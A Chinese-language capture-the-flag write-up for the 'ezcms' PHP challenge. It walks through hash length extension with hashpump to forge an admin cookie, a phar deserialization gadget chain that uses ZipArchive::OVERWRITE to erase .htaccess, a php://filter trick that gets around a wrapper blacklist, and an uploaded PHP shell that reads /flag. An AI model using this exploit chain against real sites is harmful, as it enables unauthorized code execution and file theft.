### 0001 ezcms

#### 第一部分

这道题考察hashpump，php反序列化(通过phar实现)

扫描目录获得源码，ｗｗｗ.zip，审计源码

```php
//index.php
<?php
error_reporting(0);
include('config.php');
if (isset($_POST['username']) && isset($_POST['password'])){
    $username = $_POST['username'];
    $password = $_POST['password'];
    $username = urldecode($username);
    $password = urldecode($password);
    if ($password === "admin"){
        die("u r not admin !!!");
    }
    $_SESSION['username'] = $username;
    $_SESSION['password'] = $password;

    if (login()){
        echo '<script>location.href="upload.php";</script>';
    }
}
```

跟进login()函数：

```php
//config.php
function login(){

    $secret = "********";
    setcookie("hash", md5($secret."adminadmin"));
    return 1;
}
```

生成一段`hash`，然后这里就用到了我们的hash拓展攻击，可以看出这是一段８位的密文

burp抓包将会获取一段hash值，当我们登录后，到`upload.php`

```php
<?php
include ("config.php");
if (isset($_FILES['file'])){
    $file_tmp = $_FILES['file']['tmp_name'];
    $file_name = $_FILES['file']['name'];
    $file_size = $_FILES['file']['size'];
    $file_error = $_FILES['file']['error'];
    if ($file_error > 0){
        die("something error");
    }
    $admin = new Admin($file_name, $file_tmp, $file_size);
    $admin->upload_file();
}else{
    $sandbox = 'sandbox/'.md5($_SERVER['REMOTE_ADDR']);
    if (!file_exists($sandbox)){
        mkdir($sandbox, 0777, true);
    }
    if (!is_file($sandbox.'/.htaccess')){
        file_put_contents($sandbox.'/.htaccess', 'lolololol, i control all');
    }
    echo "view my file : "."<br>";
    $path = "./".$sandbox;
    $dir = opendir($path);
    while (($filename = readdir($dir)) !== false){
        if ($filename != '.' && $filename != '..'){
            $files[] = $filename;
        }
    }
    foreach ($files as $k=>$v){
        $filepath = $path.'/'.$v;
        echo <<<EOF
        <div style="width: 1000px; height: 30px;">
        <Ariel>filename: {$v}</Ariel>
        <a href="view.php?filename={$v}&filepath={$filepath}">view detail</a>
</div>
EOF;
    }
    closedir($dir);

}
```

关键函数：

```php
    $admin = new Admin($file_name, $file_tmp, $file_size);
    $admin->upload_file();
```



看到`Admin`类:

```php
 $this->checker = $profile->is_admin();
 ...
 //Profile类
 public function is_admin(){
        $this->username = $_SESSION['username'];
        $this->password = $_SESSION['password'];
        $secret = "********";
        if ($this->username === "admin" && $this->password != "admin"){
            if ($_COOKIE['user'] === md5($secret.$this->username.$this->password)){
                return 1;
            }
        }
        return 0;

  }
```



这里的关键代码：

```php
        $secret = "********";
        if ($this->username === "admin" && $this->password != "admin"){
            if ($_COOKIE['user'] === md5($secret.$this->username.$this->password)){
                return 1;
            }
        }
```

上传文件时得是admin才能上传文件，验证的方式是通过`$_COOKIE['user']`和`md5($secret.$this->username.$this->password)`进行验证，这两个东西，我们可以通过hash拓展进行伪造

```
hashpump -s "52107b08c0f3342d2153ae1d68e6262c" -d adminadmin -k 8 -a admin123
$_COOKIE['user']:da87617c23790ab325af3e593dbc093c
username:admin
password:admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00admin123

admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00admin123
```

然后登录，上传文件时得记得带上$_COOKIE['user']，这样就能上传文件了。



#### 第二部分

当我们在访问upload.php时将会生成一个.htaccess文件。由于这个文件里面的内容被服务器写死了，所以我们上传的马无法被正常地解析，所以我们要做的就是给.htaccess做手脚。

```php
<?php
error_reporting(0);
include ("config.php");
$file_name = $_GET['filename'];
$file_path = $_GET['filepath'];
$file_name=urldecode($file_name);
$file_path=urldecode($file_path);
$file = new File($file_name, $file_path);
$res = $file->view_detail();
$mine = $res['mine'];
$store_path = $res['store_path'];
```

跟进view_detail()

```php
    public function view_detail(){
        if      (preg_match('/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i', $this->filepath))
        {
            die("nonono~");
        }
        $mine = mime_content_type($this->filepath);
        $store_path = $this->open($this->filename, $this->filepath);
        $res['mine'] = $mine;
        $res['store_path'] = $store_path;
        return $res;
    }
```

这里的`mime_content_type()`函数将会触发phar引起的反序列化漏洞。

```php
class File{

    public $checker;

    function __construct($filename, $filepath)
    {
        $this->filepath = $filepath;
        $this->filename = $filename;
    }
    ... ... 
    function __destruct()
    {
        if (isset($this->checker)){
            $this->checker->upload_file();
        }
    }
}
```

这里的`$checker`是我们可控的。

```php
class Profile{

    public $username;
    public $password;
    public $admin;

    public function is_admin(){
        $this->username = $_SESSION['username'];
        $this->password = $_SESSION['password'];
        $secret = "********";
        if ($this->username === "admin" && $this->password != "admin"){
            if ($_COOKIE['user'] === md5($secret.$this->username.$this->password)){
                return 1;
            }
        }
        return 0;

    }
    function __call($name, $arguments)
    {
        $this->admin->open($this->username, $this->password);
    }
}
```

当调用该类中的一个不存在的函数时，将会触发`__call()`魔术方法，可奇怪的是这个类中并没有`open()`函数，考虑到可能内置类的函数。

参考链接：[https://www.php.net/manual/tr/function.ziparchive-open.php](https://www.php.net/manual/tr/function.ziparchive-open.php)

<img src="/home/cookie/Pictures/blogs/9.png" style="zoom:50%;" />

**ZIPARCHIVE::OVERWRITE** ([integer](https://www.php.net/manual/zh/language.types.integer.php))

总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖。

所以我们可以通过设置$filename为`.htaccess`的路径，然后通过这个办法将其覆盖。

```php
<?php
class File
{
    public $filename;
    public $filepath;
    public $checker;
    function __construct()
    {
        $this->checker = new Profile();
    }
    function __destruct()
    {
        if (isset($this->checker)) {
            $this->checker->upload_file();
        }
    }
}
class Profile
{
    public $username;
    public $password;
    public $admin;
    function __construct()
    {
        $this->admin = new ZipArchive();
        $this->username = '/var/www/html/sandbox/0a8a3ff9ed88d2847af85fde49c7e9ae/.htaccess';
        $this->password = ZIPARCHIVE::OVERWRITE;
    }
    function __call($name, $arguments)
    {
        $this->admin->open($this->username, $this->password);
    }
}
@unlink("test.phar");
$phar = new Phar("43.phar");
//后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER();?>");
//设置stub
$o = new File();
$phar->setMetadata($o);
//将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test");
//添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
```

上传該phar文件。访问該文件。使得解除`.htaccess`被写乱的现状。

访问該链接，就是为了触发phar反序列化漏洞。

```
http://112.126.102.158:9999/view.php?filename=&filepath=php://filter/convert.base64-
encode/resource=phar://sandbox/0a8a3ff9ed88d2847af85fde49c7e9ae/dab4372519226a4dccef3b43f41200c1.phar
```

使用`filter://`是为了绕过黑名单



接着上传木马

```php
<?php
var_dump(file_get_contents("/flag"));
?>
```



访问链接：

```
http://112.126.102.158:9999/sandbox/0a8a3ff9ed88d2847af85fde49c7e9ae/71c31cca71459cafdb161a3f63a6fdc7.php
```

获得flag





